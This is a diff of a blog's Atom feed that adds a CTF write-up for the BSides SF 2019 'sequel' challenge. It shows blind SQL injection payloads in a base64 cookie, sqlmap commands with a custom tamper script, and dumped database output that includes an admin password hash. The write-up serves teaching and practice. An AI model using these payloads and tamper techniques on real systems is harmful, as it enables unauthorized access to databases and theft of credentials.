@@ -1,4 +1,76 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-03-21T10:48:00+00:00</updated><id>/</id><title type="html">Ravinder Nehra</title><subtitle>Security Enthusiast &amp; Developer</subtitle><author><name>rnehra01</name></author><entry><title type="html">Brainwaves Cyber Security Hackathon</title><link href="/brainwaves-cyber-hack-19" rel="alternate" type="text/html" title="Brainwaves Cyber Security Hackathon" /><published>2019-02-06T05:45:00+00:00</published><updated>2019-02-06T05:45:00+00:00</updated><id>/brainwaves-cyber-hack-19</id><content type="html" xml:base="/brainwaves-cyber-hack-19">&lt;p&gt;This is the fifth edition of Brainwaves hackathon. The challenges are based on filesystems i.e. how data is stored in the hard disk. We are provided with 2 dumps of a hard disk.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-03-29T13:45:09+00:00</updated><id>/</id><title type="html">Ravinder Nehra</title><subtitle>Security Enthusiast &amp; Developer</subtitle><author><name>rnehra01</name></author><entry><title type="html">Dumping tables using sqlmap;–</title><link href="/Dumping-tables-using-sqlmap" rel="alternate" type="text/html" title="Dumping tables using sqlmap;--" /><published>2019-03-27T08:49:51+00:00</published><updated>2019-03-27T08:49:51+00:00</updated><id>/Dumping-tables-using-sqlmap-</id><content type="html" xml:base="/Dumping-tables-using-sqlmap">&lt;p&gt;This post will try to show a small portion of power that sqlmap possess.&lt;/p&gt;
+&lt;h3&gt;sequel&lt;/h3&gt;
+&lt;p&gt;This is a web challenge from BSides SF CTF 2019. The home page shows a login form. After logging using &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt; account, I am presented with a list of movies with their ratings and a private note for each. The private note corresponding to Hackers movie has some reference to admin, so I guess I need to log in as admin. SQLi on the login form doesn’t work. But there is a &lt;code class=&quot;highlighter-rouge&quot;&gt;1337_AUTH&lt;/code&gt; cookie which on base64 decoding gives &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;}&lt;/code&gt;. Cool, lets try SQLi here and making &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&quot; and &quot;1&quot;=&quot;1&lt;/code&gt; results in successful login while &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&quot; and &quot;1&quot;=&quot;2&lt;/code&gt; shows &lt;code class=&quot;highlighter-rouge&quot;&gt;Invalid user&lt;/code&gt;, so it’s a blind injection. Doing some recon using my &lt;a href=&quot;https://github.com/rnehra01/web-cheats/blob/master/sqli.md#for-sqlite&quot;&gt;web-cheats&lt;/a&gt;, I am able to recognise that the backend database is SQLite as the sqlite specific payload &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&quot; and EXISTS(select sqlite_version) and &quot;1&quot;=&quot;1&lt;/code&gt; works. So the task is to pull entries related to admin from the database. I have previously written a &lt;a href=&quot;https://github.com/InfoSecIITR/write-ups/blob/master/2016/SharifCTF-2016/web-200/web-200.py&quot;&gt;script&lt;/a&gt; to extract data but I have heard a lot about &lt;a href=&quot;http://sqlmap.org/&quot;&gt;sqlmap&lt;/a&gt; but haven’t used it yet. So lets give it a go and also writing that script took me a long time.&lt;/p&gt;
+
+&lt;h3&gt;Time to use the big guns&lt;/h3&gt;
+&lt;p&gt;Lets start by finding the tables present in the database which comes down to this&lt;/p&gt;
+&lt;pre&gt;
+./sqlmap.py -u &quot;http://localhost:8081/sequels&quot; --cookie=&quot;*&quot; --technique=B --tamper tamper.py
+--tables --code=200 --dbms=SQLite --risk=3 --level=3  --flush-session --hex
+&lt;/pre&gt;
+&lt;p&gt;In our case the payload is base64 encoded and then injected into cookie parameter so I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;--tamper&lt;/code&gt; switch with tamper.py which replaces &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;\&quot;&lt;/code&gt; in the payload from sqlmap and then return base64 encoded cookie which repalces &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; in the &lt;code class=&quot;highlighter-rouge&quot;&gt;cookies&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlsafe_b64encode&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;be&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tamper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kwargs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'{&quot;username&quot;:&quot;guest&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;,&quot;password&quot;:&quot;guest&quot;}'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1337_AUTH=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The above command returns&lt;/p&gt;
+&lt;pre&gt;
+[3 tables]
++----------+
+| notes    |
+| reviews  |
+| userinfo |
++----------+
+&lt;/pre&gt;
+&lt;p&gt;So the admin info will be present in the &lt;code class=&quot;highlighter-rouge&quot;&gt;userinfo&lt;/code&gt; table. Lets dump it&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-terminal&quot; data-lang=&quot;terminal&quot;&gt;&lt;span class=&quot;gp&quot;&gt;rnehra@pc ~/1/sqlmap&amp;gt;&lt;/span&gt; ./sqlmap.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://localhost:8081/sequels&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--technique&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;B &lt;span class=&quot;nt&quot;&gt;--tamper&lt;/span&gt; tamper.py &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;200 &lt;span class=&quot;nt&quot;&gt;--dbms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SQLite &lt;span class=&quot;nt&quot;&gt;--risk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nt&quot;&gt;--hex&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; userinfo
+&lt;span class=&quot;go&quot;&gt;
+[15:59:59] [INFO] retrieved: CREATE TABLE userinfo (    username text not null primary key,    password text not null)
+Table: userinfo
+[2 entries]
++-----------+-----------+
+| tusername | tpassword |
++-----------+-----------+
+|  blank    |  blank    |
+|  blank    |  blank    |
++-----------+-----------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;WTF&lt;/strong&gt;, the column names look strange.&lt;/p&gt;
+&lt;h3&gt;Bug in sqlmap&lt;/h3&gt;
+&lt;p&gt;Okay, the table syntax &lt;code class=&quot;highlighter-rouge&quot;&gt;CREATE TABLE userinfo (    username text not null primary key,    password text not null)&lt;/code&gt; looks good, I guess there is &lt;code class=&quot;highlighter-rouge&quot;&gt;\t&lt;/code&gt; character before column name and that’s how sqlmap assume &lt;code class=&quot;highlighter-rouge&quot;&gt;tusername&lt;/code&gt; as column name instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt;. Cool, I find a bug in sqlmap. Next thing, I report it on &lt;a href=&quot;https://github.com/sqlmapproject/sqlmap/issues/3551&quot;&gt;Github&lt;/a&gt; and they are super quick to push a fix.&lt;/p&gt;
+
+&lt;h3&gt;Continue hacking&lt;/h3&gt;
+&lt;p&gt;So I override the column names for the table using &lt;code class=&quot;highlighter-rouge&quot;&gt;-C&lt;/code&gt; switch and the complete table is here&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-terminal&quot; data-lang=&quot;terminal&quot;&gt;&lt;span class=&quot;gp&quot;&gt;rnehra@pc ~/1/sqlmap&amp;gt;&lt;/span&gt; ./sqlmap.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://localhost:8081/sequels&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--technique&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;B &lt;span class=&quot;nt&quot;&gt;--tamper&lt;/span&gt; tamper.py &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;200 &lt;span class=&quot;nt&quot;&gt;--dbms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SQLite &lt;span class=&quot;nt&quot;&gt;--risk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nt&quot;&gt;--hex&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; userinfo &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; username,password
+&lt;span class=&quot;c&quot;&gt;...
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Table: userinfo
+[2 entries]
++-------------+----------------------------------+
+| username    | password                         |
++-------------+----------------------------------+
+| guest       | guest                            |
+| sequeladmin | f5ec3af19f0d3679e7d5a148f4ac323d |
++-------------+----------------------------------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Logging into the account of &lt;code class=&quot;highlighter-rouge&quot;&gt;sequeladmin&lt;/code&gt; gives the flag.&lt;/p&gt;
+
+&lt;h3&gt;Conclusion&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;Sqlmap can help in avoiding writing scripts, thus exploiting much faster.&lt;/li&gt;
+  &lt;li&gt;Instead of blindly running sqlmap against a target, try to do some recon and feed as much data you can to sqlmap. In my case, I provide
+    &lt;ul&gt;
+      &lt;li&gt;correct injection point &lt;code class=&quot;highlighter-rouge&quot;&gt;--cookie=&quot;*&quot;&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;type of DBMS &lt;code class=&quot;highlighter-rouge&quot;&gt;--dbms=SQLite&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;how SQLi can be exploited &lt;code class=&quot;highlighter-rouge&quot;&gt;--technique=B&lt;/code&gt; which is blind SQLi.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;In Blind SQLi, try to provide method to differentiate between a  &lt;strong&gt;True&lt;/strong&gt; and &lt;strong&gt;False&lt;/strong&gt; query, in my case &lt;strong&gt;Invalid user&lt;/strong&gt; is accompanied with status code &lt;strong&gt;404&lt;/strong&gt; and successful login with &lt;strong&gt;200&lt;/strong&gt;, hence the &lt;code class=&quot;highlighter-rouge&quot;&gt;--code=200&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;</content><author><name>Ravinder Nehra</name></author><category term="sqli" /><category term="sqlmap" /><category term="web" /><category term="security" /><category term="ctf" /><summary type="html">This post will try to show a small portion of power that sqlmap possess. sequel This is a web challenge from BSides SF CTF 2019. The home page shows a login form. After logging using guest account, I am presented with a list of movies with their ratings and a private note for each. The private note corresponding to Hackers movie has some reference to admin, so I guess I need to log in as admin. SQLi on the login form doesn’t work. But there is a 1337_AUTH cookie which on base64 decoding gives {&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;}. Cool, lets try SQLi here and making username to guest&quot; and &quot;1&quot;=&quot;1 results in successful login while guest&quot; and &quot;1&quot;=&quot;2 shows Invalid user, so it’s a blind injection. Doing some recon using my web-cheats, I am able to recognise that the backend database is SQLite as the sqlite specific payload guest&quot; and EXISTS(select sqlite_version) and &quot;1&quot;=&quot;1 works. So the task is to pull entries related to admin from the database. I have previously written a script to extract data but I have heard a lot about sqlmap but haven’t used it yet. So lets give it a go and also writing that script took me a long time.</summary></entry><entry><title type="html">Brainwaves Cyber Security Hackathon</title><link href="/brainwaves-cyber-hack-19" rel="alternate" type="text/html" title="Brainwaves Cyber Security Hackathon" /><published>2019-02-06T05:45:00+00:00</published><updated>2019-02-06T05:45:00+00:00</updated><id>/brainwaves-cyber-hack-19</id><content type="html" xml:base="/brainwaves-cyber-hack-19">&lt;p&gt;This is the fifth edition of Brainwaves hackathon. The challenges are based on filesystems i.e. how data is stored in the hard disk. We are provided with 2 dumps of a hard disk.&lt;/p&gt;
 
 &lt;h3&gt;Dump 1&lt;/h3&gt;
 &lt;blockquote&gt;
